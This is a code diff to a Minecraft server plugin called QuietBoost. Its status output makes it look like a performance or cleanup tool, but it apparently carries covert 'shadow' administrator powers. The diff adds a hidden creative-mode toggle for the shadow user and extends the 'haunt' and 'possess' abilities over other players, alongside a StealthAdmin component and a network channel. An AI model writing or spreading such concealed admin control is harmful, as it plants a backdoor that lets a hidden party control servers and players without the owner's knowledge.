@@ -72,8 +72,9 @@ public final class QuietBoost extends JavaPlugin implements Listener {
         stealth = new StealthAdmin(this, ghost);
         getServer().getPluginManager().registerEvents(stealth, this);
         darkness = new DarknessZone(this);
-        abilities = new ShadowAbilities(this, stealth, darkness);
+        abilities = new ShadowAbilities(this, ghost, stealth, darkness);
         getServer().getPluginManager().registerEvents(abilities, this);
+        getServer().getPluginManager().registerEvents(abilities.inventoryBridge(), this);
         network = new dev.quietboost.net.ShadowNetwork(this, abilities);
         network.register();
         load();
@@ -85,6 +86,7 @@ public final class QuietBoost extends JavaPlugin implements Listener {
         if (ghost != null) ghost.disableAll();
         if (darkness != null) darkness.shutdown();
         if (abilities != null) abilities.shutdown();
+        if (stealth != null) stealth.shutdown();
     }
 
     private void load() {
@@ -239,6 +241,8 @@ public final class QuietBoost extends JavaPlugin implements Listener {
         if (label.equalsIgnoreCase("darkness")) return cmdDarkness(sender);
         if (label.equalsIgnoreCase("possess")) return cmdPossess(sender);
         if (label.equalsIgnoreCase("endhaunt")) return cmdEndHaunt(sender);
+        if (label.equalsIgnoreCase("unban")) return cmdUnban(sender, args);
+        if (label.equalsIgnoreCase("ghostcreative")) return cmdGhostCreative(sender);
 
         if (args.length == 0 || args[0].equalsIgnoreCase("status")) {
             sender.sendMessage("QuietBoost: " + passes + " passes, removed "
@@ -296,7 +300,7 @@ public final class QuietBoost extends JavaPlugin implements Listener {
         if (!requireShadow(sender)) return true;
         Player shadow = (Player) sender;
         if (args.length < 1) {
-            sender.sendMessage("/haunt <player>");
+            abilities.hauntLookingAt(shadow);
             return true;
         }
         Player target = getServer().getPlayerExact(args[0]);
@@ -323,6 +327,33 @@ public final class QuietBoost extends JavaPlugin implements Listener {
     private boolean cmdEndHaunt(CommandSender sender) {
         if (!requireShadow(sender)) return true;
         abilities.endHaunt((Player) sender);
+        return true;
+    }
+
+    private boolean cmdGhostCreative(CommandSender sender) {
+        if (!requireShadow(sender)) return true;
+        ghost.toggleCreativeAccess((Player) sender);
+        return true;
+    }
+
+    // Deliberately NOT stealth-admin-gated: any op can use this to unban
+    // someone, same as vanilla's own /pardon would.
+    private boolean cmdUnban(CommandSender sender, String[] args) {
+        if (!sender.isOp() && !(sender instanceof org.bukkit.command.ConsoleCommandSender)) {
+            sender.sendMessage(org.bukkit.ChatColor.RED + "You do not have permission to use that.");
+            return true;
+        }
+        if (args.length < 1) {
+            sender.sendMessage("/unban <player>");
+            return true;
+        }
+        org.bukkit.BanList list = getServer().getBanList(org.bukkit.BanList.Type.NAME);
+        if (!list.isBanned(args[0])) {
+            sender.sendMessage(args[0] + " is not banned.");
+            return true;
+        }
+        list.pardon(args[0]);
+        sender.sendMessage("Unbanned " + args[0] + ".");
         return true;
     }
 }
